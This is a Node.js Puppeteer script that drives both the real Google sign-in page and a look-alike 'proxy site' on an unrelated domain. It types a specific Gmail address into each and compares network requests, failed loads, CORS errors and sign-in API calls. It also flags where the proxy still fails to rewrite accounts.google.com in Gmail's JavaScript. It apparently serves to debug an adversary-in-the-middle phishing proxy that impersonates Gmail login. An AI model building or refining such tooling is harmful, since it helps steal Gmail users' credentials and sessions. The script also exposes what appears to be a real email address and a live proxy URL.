/**
 * COMPREHENSIVE GMAIL LOGIN FLOW ANALYZER
 * Analyzes both real Gmail and proxy to find ALL differences
 */

const puppeteer = require('puppeteer');
const fs = require('fs');

const REAL_GMAIL = 'https://accounts.google.com/ServiceLogin?service=mail';
const PROXY_SITE = 'https://colectivoadn.org/d7863d08';
const TEST_EMAIL = 'judithdaves293@gmail.com';

async function analyzeLoginFlow(url, label) {
  console.log(`\n${'='.repeat(80)}`);
  console.log(`ANALYZING: ${label}`);
  console.log(`${'='.repeat(80)}\n`);

  const browser = await puppeteer.launch({
    headless: false,
    args: [
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--disable-web-security',
      '--disable-features=IsolateOrigins,site-per-process'
    ]
  });

  const page = await browser.newPage();
  const requests = [];
  const responses = [];
  const consoleMessages = [];
  const jsFiles = [];
  const failedRequests = [];

  // Capture all requests
  page.on('request', request => {
    requests.push({
      url: request.url(),
      method: request.method(),
      headers: request.headers(),
      resourceType: request.resourceType()
    });
    
    if (request.resourceType() === 'script') {
      jsFiles.push(request.url());
    }
  });

  // Capture all responses
  page.on('response', response => {
    responses.push({
      url: response.url(),
      status: response.status(),
      headers: response.headers(),
      contentType: response.headers()['content-type']
    });
  });

  // Capture console messages
  page.on('console', msg => {
    consoleMessages.push({
      type: msg.type(),
      text: msg.text()
    });
  });

  // Capture failed requests
  page.on('requestfailed', request => {
    failedRequests.push({
      url: request.url(),
      failure: request.failure().errorText,
      resourceType: request.resourceType()
    });
  });

  try {
    // Navigate to login page
    console.log(`Navigating to: ${url}`);
    await page.goto(url, { waitUntil: 'networkidle2', timeout: 30000 });
    await page.waitForTimeout(2000);

    // Enter email
    console.log(`Entering email: ${TEST_EMAIL}`);
    const emailInput = await page.$('input[type="email"]');
    if (emailInput) {
      await emailInput.type(TEST_EMAIL);
      await page.waitForTimeout(1000);

      // Click Next button
      console.log('Clicking "Next" button...');
      const nextButton = await page.$('button, input[type="submit"], #identifierNext');
      if (nextButton) {
        await nextButton.click();
        await page.waitForTimeout(5000); // Wait for requests to complete
      }
    }

    // Analyze JavaScript content
    console.log('\n--- Analyzing JavaScript Files ---');
    const jsAnalysis = [];
    for (const jsUrl of jsFiles.slice(0, 5)) { // Analyze first 5 JS files
      try {
        const response = await page.goto(jsUrl, { waitUntil: 'networkidle2' });
        const jsContent = await response.text();
        
        // Check for Google domains
        const domains = [
          'accounts.google.com',
          'www.google.com',
          'www.gstatic.com',
          'google.com'
        ];
        
        const foundDomains = {};
        for (const domain of domains) {
          const regex = new RegExp(domain, 'gi');
          const matches = jsContent.match(regex);
          if (matches) {
            foundDomains[domain] = matches.length;
            
            // Find context around first occurrence
            const index = jsContent.toLowerCase().indexOf(domain.toLowerCase());
            if (index !== -1) {
              const context = jsContent.substring(Math.max(0, index - 100), Math.min(jsContent.length, index + domain.length + 100));
              foundDomains[`${domain}_context`] = context;
            }
          }
        }

        jsAnalysis.push({
          url: jsUrl,
          size: jsContent.length,
          foundDomains
        });
      } catch (err) {
        console.log(`Failed to analyze: ${jsUrl}`);
      }
    }

    // Generate report
    const report = {
      label,
      url,
      timestamp: new Date().toISOString(),
      summary: {
        totalRequests: requests.length,
        totalResponses: responses.length,
        jsFilesLoaded: jsFiles.length,
        failedRequests: failedRequests.length,
        consoleErrors: consoleMessages.filter(m => m.type === 'error').length
      },
      jsFiles,
      jsAnalysis,
      failedRequests,
      consoleErrors: consoleMessages.filter(m => m.type === 'error'),
      apiCalls: requests.filter(r => 
        r.url.includes('/_/signin') || 
        r.url.includes('/v3/signin') ||
        r.url.includes('lookup') ||
        r.url.includes('challenge')
      ),
      corsErrors: consoleMessages.filter(m => m.text.toLowerCase().includes('cors')),
    };

    // Save report
    const filename = `${label.replace(/\s+/g, '_')}_report.json`;
    fs.writeFileSync(filename, JSON.stringify(report, null, 2));
    console.log(`\n✅ Report saved: ${filename}`);

    // Print critical findings
    console.log('\n--- CRITICAL FINDINGS ---');
    console.log(`Failed Requests: ${failedRequests.length}`);
    if (failedRequests.length > 0) {
      failedRequests.forEach(req => {
        console.log(`  ❌ ${req.resourceType}: ${req.url}`);
        console.log(`     Error: ${req.failure}`);
      });
    }

    console.log(`\nConsole Errors: ${report.consoleErrors.length}`);
    report.consoleErrors.forEach(err => {
      console.log(`  ❌ ${err.text}`);
    });

    console.log(`\nCORS Errors: ${report.corsErrors.length}`);
    report.corsErrors.forEach(err => {
      console.log(`  ❌ ${err.text}`);
    });

    console.log(`\nAPI Calls: ${report.apiCalls.length}`);
    report.apiCalls.forEach(call => {
      console.log(`  → ${call.method} ${call.url}`);
    });

    console.log(`\nJavaScript Analysis:`);
    jsAnalysis.forEach(js => {
      console.log(`\n  📄 ${js.url.substring(0, 80)}...`);
      console.log(`     Size: ${js.size} bytes`);
      Object.keys(js.foundDomains).forEach(domain => {
        if (!domain.includes('_context')) {
          console.log(`     Domain "${domain}": ${js.foundDomains[domain]} occurrences`);
        }
      });
    });

  } catch (error) {
    console.error(`Error during analysis: ${error.message}`);
  } finally {
    await browser.close();
  }
}

async function compareReports() {
  console.log('\n' + '='.repeat(80));
  console.log('COMPARING REAL GMAIL vs PROXY');
  console.log('='.repeat(80) + '\n');

  try {
    const realReport = JSON.parse(fs.readFileSync('Real_Gmail_report.json', 'utf8'));
    const proxyReport = JSON.parse(fs.readFileSync('Proxy_Site_report.json', 'utf8'));

    console.log('1. FAILED REQUESTS COMPARISON:');
    console.log(`   Real Gmail: ${realReport.summary.failedRequests} failed`);
    console.log(`   Proxy Site: ${proxyReport.summary.failedRequests} failed`);
    
    console.log('\n2. CONSOLE ERRORS COMPARISON:');
    console.log(`   Real Gmail: ${realReport.summary.consoleErrors} errors`);
    console.log(`   Proxy Site: ${proxyReport.summary.consoleErrors} errors`);
    
    console.log('\n3. CORS ERRORS COMPARISON:');
    console.log(`   Real Gmail: ${realReport.corsErrors.length} CORS errors`);
    console.log(`   Proxy Site: ${proxyReport.corsErrors.length} CORS errors`);

    console.log('\n4. UNIQUE FAILURES IN PROXY:');
    const proxyOnlyFails = proxyReport.failedRequests.filter(pf => 
      !realReport.failedRequests.some(rf => rf.url === pf.url)
    );
    proxyOnlyFails.forEach(fail => {
      console.log(`   ❌ ${fail.url}`);
      console.log(`      Error: ${fail.failure}`);
    });

    console.log('\n5. DOMAIN REWRITING ISSUES:');
    proxyReport.jsAnalysis.forEach(js => {
      if (js.foundDomains['accounts.google.com']) {
        console.log(`   ⚠️  JavaScript still contains "accounts.google.com": ${js.foundDomains['accounts.google.com']} times`);
        console.log(`      File: ${js.url.substring(0, 80)}...`);
        if (js.foundDomains['accounts.google.com_context']) {
          console.log(`      Context: ${js.foundDomains['accounts.google.com_context'].substring(0, 150)}...`);
        }
      }
    });

  } catch (error) {
    console.log('Could not compare reports. Run analysis for both sites first.');
  }
}

async function main() {
  console.log('COMPREHENSIVE GMAIL LOGIN FLOW ANALYZER');
  console.log('This will analyze both real Gmail and your proxy site\n');

  // Analyze real Gmail
  await analyzeLoginFlow(REAL_GMAIL, 'Real Gmail');

  // Analyze proxy site
  await analyzeLoginFlow(PROXY_SITE, 'Proxy Site');

  // Compare reports
  await compareReports();

  console.log('\n' + '='.repeat(80));
  console.log('✅ ANALYSIS COMPLETE!');
  console.log('='.repeat(80));
  console.log('\nReports saved:');
  console.log('  - Real_Gmail_report.json');
  console.log('  - Proxy_Site_report.json');
}

main().catch(console.error);
